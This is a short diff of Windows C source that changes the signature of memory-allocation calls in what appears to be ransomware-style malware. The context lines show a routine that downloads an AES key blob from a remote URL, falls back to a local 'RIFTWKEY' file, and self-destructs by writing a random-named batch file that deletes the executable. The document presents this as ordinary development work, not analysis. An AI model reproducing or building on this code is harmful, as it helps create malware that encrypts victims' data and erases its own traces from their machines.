@@ -43,7 +43,7 @@ INT WINAPI wWinMain(
 
 	PVOID pWKey = IDownloadKey();
 	if (!pWKey) {
-		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH, 0);
+		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
 		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
@@ -112,7 +112,7 @@ PVOID IDownloadKey() {
 		return 0;
 	FreeMemory(szURL);
 
-	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE, 0);
+	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
 
 	SIZE_T nRead;
 	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
@@ -147,7 +147,7 @@ static CONST WCHAR l_szSelfDelBat[] = {
 };
 VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
-	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR), 0);
+	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
 	SIZE_T nRandom;
 	PCWSTR szRandom = EAllocRandomPathW(8, 16, &nRandom);
 	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
@@ -155,7 +155,7 @@ VOID ESelfDestruct() {
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
-	PVOID pScriptW = AllocMemory(0x800, 0);
+	PVOID pScriptW = AllocMemory(0x800);
 	UINT uiRandomID = EXoshiroSS();
 	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
 	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
@@ -163,7 +163,7 @@ VOID ESelfDestruct() {
 	// Convert to Raw (ANSI)
 	SIZE_T nScript;
 	StringCchLengthW(pScriptW, 0x400, &nScript);
-	PSTR pScriptA = AllocMemory(0x400, 0);
+	PSTR pScriptA = AllocMemory(0x400);
 	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
 	FreeMemory(pScriptW);
 
